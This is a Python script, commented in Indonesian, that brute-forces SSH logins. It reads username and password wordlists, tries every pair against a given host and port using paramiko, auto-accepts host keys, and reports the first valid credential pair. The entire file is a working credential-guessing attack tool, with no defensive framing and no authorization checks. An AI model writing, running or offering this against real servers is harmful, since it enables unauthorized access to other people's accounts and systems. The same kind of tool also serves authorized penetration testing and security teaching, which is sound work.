import sys
import getopt
import paramiko

USERNAMES = []
USERNAME_COUNT = 0
PASSWORDS = []
PASSWORD_COUNT = 0
HOST = ""
PORT = 0

def start_ssh():
    found = False
    for username in USERNAMES :
        for password in PASSWORDS :
            client = paramiko.SSHClient()
            #otomatis di yes kan
            client.set_missing_host_key_policy(
                paramiko.AutoAddPolicy()
            )
            try:
                client.connect(HOST,username=username, password=password, port = PORT, auth_timeout=0.5)
                print("{} and {} combination is valid".format(username,password))
                found = True
                break
            except:
                print("{} and {} combination is invalid".format(username,password))

        if found==True:
            break

def main():
    global USERNAMES,USERNAME_COUNT,PASSWORDS,PASSWORD_COUNT,HOST,PORT
    args = sys.argv[1:]
    #parameter 2 bentuk pendeknya, kalau butuh parameter pake :
    opts, _ = getopt.getopt(args,"L:P:th:s:",["login=","password=","host=","port=","help"])
    
    #print(opts)

    for key,value in opts:
        if key=="-L" or key=="--login":
            USERNAMES = read_file(value)
            USERNAME_COUNT = len(USERNAMES)
        elif key=="-P" or key=="--password":
            PASSWORDS= read_file(value)
            PASSWORD_COUNT = len(PASSWORDS)
        elif key=="-h" or key == "--host":
            HOST = value
        elif key == "-s" or key == "--port":
            PORT = int(value)
    start_ssh()

def read_file(file_name):
    file = open(file_name)
    words= file.readlines()
    words = list(map(strip_text,words))
    return words

def strip_text(word):
    return word.strip()

if __name__ == "__main__":
    main()

